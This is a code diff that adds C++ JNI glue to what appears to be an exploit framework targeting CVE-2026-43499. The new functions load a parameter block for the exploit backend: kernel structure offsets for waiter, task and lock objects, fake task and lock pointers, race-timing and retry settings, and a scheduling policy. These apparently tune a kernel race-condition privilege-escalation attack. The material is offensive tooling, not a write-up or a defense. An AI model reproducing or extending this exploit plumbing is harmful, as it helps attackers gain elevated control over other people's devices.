@@ -89,6 +89,50 @@ namespace ghostlock::jni {
         params.offset_set = offset_set;
     }
 
+/** Fill params from the assembly (new path; the four-argument one stays). */
+void fill_access_params_43499_full(backend::cve_2026_43499::Access43499Parameters &params,
+                                 const std::uint64_t route, const std::uint64_t offset,
+                                 const bool offset_set, const std::uint64_t *const assembly,
+                                 const std::size_t count) noexcept {
+    fill_access_params_43499(params, route, offset, offset_set);
+    if (assembly == nullptr || count < 17U) {
+        return;
+    }
+    params.stamp_waiter_offset = assembly[0];
+    params.stamp_task_offset = assembly[1];
+    params.stamp_lock_offset = assembly[2];
+    params.stamp_buffer_size = assembly[3];
+    params.max_attempts = static_cast<std::uint32_t>(assembly[4]);
+    params.arm_hold = static_cast<std::uint32_t>(assembly[5]);
+    params.arm_sequence = static_cast<std::uint32_t>(assembly[6]);
+    params.park_ms = static_cast<std::uint32_t>(assembly[7]);
+    params.settle_us = static_cast<std::uint32_t>(assembly[8]);
+    params.consumer_delay_us = static_cast<std::uint32_t>(assembly[9]);
+    params.burst_calls = static_cast<std::uint32_t>(assembly[10]);
+    params.max_calls = static_cast<std::uint32_t>(assembly[11]);
+    params.fallback_lock_us = static_cast<std::uint32_t>(assembly[12]);
+    params.nice_modulus = static_cast<std::uint32_t>(assembly[13]);
+    params.policy = static_cast<std::uint32_t>(assembly[14]);
+    params.fake_task = assembly[15];
+    params.fake_lock = assembly[16];
+}
+
+/** Initialize with the assembly (new; the old entry point is untouched). */
+int device_initialize_43499_full(const std::uint64_t accessId, const std::uint64_t route,
+                                 const std::uint64_t offset, const bool offset_set,
+                                 const std::uint64_t *const assembly, const std::size_t count) noexcept {
+    if (accessId == 0U) {
+        return -1;
+    }
+    const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
+    if (slot >= kMaxAccesses43499 || g_accesses_43499[slot] == nullptr) {
+        return -2;
+    }
+    backend::cve_2026_43499::Access43499Parameters params{};
+    fill_access_params_43499_full(params, route, offset, offset_set, assembly, count);
+    const auto up = g_accesses_43499[slot]->initialize(params);
+    return up.ok() ? 0 : static_cast<int>(up.status);
+}
     /** @return 0 成功；否则 Access 状态码（上层翻具名）。 */
     int device_initialize_43499(const std::uint64_t accessId, const std::uint64_t route,
                                 const std::uint64_t offset, const bool offset_set) noexcept {
